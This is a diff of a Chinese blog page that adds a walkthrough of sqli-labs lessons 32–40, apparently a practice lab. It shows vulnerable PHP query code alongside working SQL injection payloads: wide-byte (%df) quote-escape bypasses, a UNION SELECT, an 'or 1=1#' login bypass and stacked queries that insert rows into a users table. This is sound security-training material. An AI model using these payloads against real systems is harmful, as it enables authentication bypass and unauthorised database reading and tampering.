</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>构造?id=1、?id=1’、?id=1”都能正常回显<br><img src="https://upload-images.jianshu.io/upload_images/15184404-bae89b148875323c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>引号可能是被转义了，宽字节注入试试</p>
+<blockquote>
+<p>?id=1%df%27</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-333f1dc08b356457.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>有错误回显，从其中可以看到被单引号闭合，注释掉后面的查询语句</p>
+<blockquote>
+<p>?id=1%df%27–+</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-12016283542e5544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>单引号闭合，宽字节注入可绕过</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
+<p>?id=-1%df%27union%20select%201,user(),3–+</p>
+</blockquote>
+<h1 id="lesson33"><a href="#lesson33" class="headerlink" title="lesson33"></a>lesson33</h1><p>payload和上题一样</p>
+<blockquote>
+<p>?id=-1%df%27union%20select%201,user(),3–+</p>
+</blockquote>
+<h1 id="lesson34"><a href="#lesson34" class="headerlink" title="lesson34"></a>lesson34</h1><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>###原理：</p>
+<h5 id="post型的注入漏洞，同样的也是将post过来的内容进行了-‘-的处理。而之前我们做的get型注入漏洞是以url形式提交的，数据会通过URLencode。在post型注入中我们可以改变注入文字的文字编码，如-‘-转为utf-16为-�’。"><a href="#post型的注入漏洞，同样的也是将post过来的内容进行了-‘-的处理。而之前我们做的get型注入漏洞是以url形式提交的，数据会通过URLencode。在post型注入中我们可以改变注入文字的文字编码，如-‘-转为utf-16为-�’。" class="headerlink" title="post型的注入漏洞，同样的也是将post过来的内容进行了 ‘ \ 的处理。而之前我们做的get型注入漏洞是以url形式提交的，数据会通过URLencode。在post型注入中我们可以改变注入文字的文字编码，如 ‘ 转为utf-16为 �’。"></a>post型的注入漏洞，同样的也是将post过来的内容进行了 ‘ \ 的处理。而之前我们做的get型注入漏洞是以url形式提交的，数据会通过URLencode。在post型注入中我们可以改变注入文字的文字编码，如 ‘ 转为utf-16为 �’。</h5><ul>
+<li>用万能密码的方式尝试登陆<br><img src="https://upload-images.jianshu.io/upload_images/15184404-21b9806b63fdc837.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>登陆成功<br><img src="https://upload-images.jianshu.io/upload_images/15184404-5744c60d0e7c087c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>此时sql语句为<blockquote>
+<p>SELECT username, password FROM users WHERE username=’�’ or 1=1#’ and password=’$passwd’ LIMIT 0,1<br>接下来就不用多说了，之前说过</p>
+</blockquote>
+<h1 id="lesson35"><a href="#lesson35" class="headerlink" title="lesson35"></a>lesson35</h1>和lesson33差不多,区别就是sql语句id没被’”括起来<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
+<p>?id=-1%20%20union%20select%201,user(),3–+</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-97207a306e159650.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h1 id="lesson36"><a href="#lesson36" class="headerlink" title="lesson36"></a>lesson36</h1><h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function check_quotes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤。<br>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br>但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
+<p>?id=-1%EF%BF%BD%27union%20select%201,user(),3–+</p>
+</blockquote>
+<h1 id="lesson37"><a href="#lesson37" class="headerlink" title="lesson37"></a>lesson37</h1>和lesson34一样，区别在于处理post内容用的是mysql_real_escape_string()函数，但是原理是一样的。<br><img src="https://upload-images.jianshu.io/upload_images/15184404-d66e9e268ef645f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><h1 id="lesson38"><a href="#lesson38" class="headerlink" title="lesson38"></a>lesson38</h1><ul>
+<li>学习了关于stacked injection的相关知识，我们在本关可以得到直接的运用。(具体原理以及知识点见下篇文章)<h5 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>原数据库<br><img src="https://upload-images.jianshu.io/upload_images/15184404-0b5e111766f08e15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<h5 id="直接构造payload："><a href="#直接构造payload：" class="headerlink" title="直接构造payload："></a>直接构造payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27Wh1te%27,%27hello%27)--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>构造后<br><img src="https://upload-images.jianshu.io/upload_images/15184404-2933a33c680b03a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><h1 id="lesson39"><a href="#lesson39" class="headerlink" title="lesson39"></a>lesson39</h1>和上题区别在于sql语句不同<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>数字型注入</p>
+<ul>
+<li>原数据库<br><img src="https://upload-images.jianshu.io/upload_images/15184404-e1a4f500a1e4b2be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert%20into%20users(id,username,password)%20values%20(%2739%27,%27NYSEC%27,%27niupi%27)--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>构造后<br><img src="https://upload-images.jianshu.io/upload_images/15184404-f0e97a59fe091cee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<h1 id="lesson40"><a href="#lesson40" class="headerlink" title="lesson40"></a>lesson40</h1><p>sql源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure></p>
+<h5 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27);%20insert%20into%20users(id,username,password)%20values%20(%27233%27,%27hi%27,%27Wh1te%27)%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-f01687448ca91e1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 
       
 
@@ -257,7 +424,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">学习</a>
         		</li>
       		
 		</ul>
@@ -313,7 +480,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/27/sqli-labs(lesson23-lesson40)/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -327,18 +494,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/01/13/CTF Web初尝试（ezsql，ereg2，买彩票吗）/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CTF Web初尝试（ezsql，ereg2，买彩票吗）
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/01/13/CTF Web初尝试（签到题，Cookie）/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF Web初尝试（签到题，Cookie）</div>
+    <a href="/2019/01/22/sql注入一些常用的东西/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sql注入一些常用的东西</div>
       <i class="icon-circle-right"></i>
     </a>
   
